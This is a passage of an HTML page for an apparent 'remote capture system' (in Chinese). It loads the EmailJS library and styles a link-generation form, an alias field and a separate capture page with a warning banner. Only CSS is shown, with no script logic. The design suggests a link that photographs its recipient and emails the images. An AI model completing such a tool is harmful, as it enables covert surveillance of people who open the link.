<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>远程拍摄系统</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }
        
        /* ========== 主界面 ========== */
        .main-box {
            background: white;
            border-radius: 16px;
            padding: 24px 20px;
            max-width: 520px;
            margin: 20px auto;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .main-box h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 20px; 
            font-size: 20px; 
        }
        
        .form-group { margin-bottom: 14px; }
        .form-group label { 
            display: block; 
            margin-bottom: 5px; 
            color: #555; 
            font-size: 13px; 
            font-weight: 500; 
        }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%; 
            padding: 10px 12px; 
            border: 2px solid #e0e0e0;
            border-radius: 8px; 
            font-size: 14px;
        }
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
            outline: none; 
            border-color: #667eea; 
        }
        .form-group textarea { min-height: 50px; resize: vertical; }
        
        .btn {
            width: 100%; 
            padding: 12px; 
            border: none; 
            border-radius: 8px;
            font-size: 15px; 
            cursor: pointer; 
            margin-top: 10px;
            font-weight: 600;
        }
        .btn-primary { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
        }
        .btn-primary:active { opacity: 0.9; }
        .btn-success { background: #28a745; color: white; }
        .btn-success:active { background: #218838; }
        
        .section-title {
            font-size: 13px; 
            font-weight: 600; 
            color: #667eea;
            margin: 16px 0 8px 0; 
            border-bottom: 1px solid #eee; 
            padding-bottom: 4px;
        }
        
        .link-box { 
            margin-top: 14px; 
            padding: 12px; 
            background: #f8f9fa; 
            border-radius: 8px; 
            border: 1px dashed #ccc; 
        }
        .link-box label { 
            font-size: 12px; 
            color: #666; 
            margin-bottom: 6px; 
            display: block;
        }
        .link-box a { 
            color: #667eea; 
            font-size: 12px; 
            word-break: break-all; 
            text-decoration: none; 
        }
        
        .alias-box {
            margin-top: 10px;
            padding: 10px;
            background: #e8f4fd;
            border-radius: 6px;
            border: 1px solid #bee5eb;
            display: none;
        }
        .alias-box label { font-size: 12px; color: #0c5460; margin-bottom: 4px; display: block; }
        .alias-box input { 
            width: 100%; 
            padding: 8px; 
            border: 1px solid #86c7da; 
            border-radius: 4px; 
            font-size: 13px; 
            margin-bottom: 8px;
        }
        
        .toast {
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.85); 
            color: white; 
            padding: 14px 24px;
            border-radius: 8px; 
            font-size: 14px; 
            display: none; 
            z-index: 1000;
            text-align: center;
        }

        /* ========== 拍摄界面 ========== */
        .capture-page {
            display: none;
            background: #1a1a2e;
            min-height: 100vh;
            padding: 60px 20px 40px;
            text-align: center;
            color: white;
        }
        
        .capture-page .bg-media { 
            margin-bottom: 24px; 
            max-width: 100%; 
        }
        .capture-page .bg-media img, 
        .capture-page .bg-media video {
            max-width: 100%; 
            border-radius: 12px; 
            max-height: 280px; 
            object-fit: cover;
        }
        
        .capture-page .warning {
            background: rgba(255,200,0,0.25); 
            border: 1px solid #ffc800;
            border-radius: 8px; 
            padding: 14px; 
            margin-bottom: 24px;
            color: #ffc800; 
            font-size: 14px;
            max-width: 400px;
